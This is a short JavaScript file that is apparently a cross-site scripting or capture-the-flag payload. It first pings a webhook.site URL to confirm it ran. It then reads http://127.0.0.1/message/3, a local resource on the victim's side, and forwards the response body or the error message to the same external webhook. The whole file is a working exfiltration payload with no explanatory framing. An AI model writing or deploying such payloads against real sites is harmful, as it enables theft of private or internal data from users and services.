

fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/attempt');
//alert('test');

function encodeStringForURL(str) {
  return encodeURIComponent(str).replace(/[!'()*]/g, function(c) {
    return '%' + c.charCodeAt(0).toString(16);
  });
}


fetch('http://127.0.0.1/message/3')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
      fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/'+response.status);
    }
    return response.json();
  })
  .then(data => {
    fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/'+encodeURIComponent(data));
  })
  .catch(error => {
    fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/'+encodeURIComponent(error));
  });


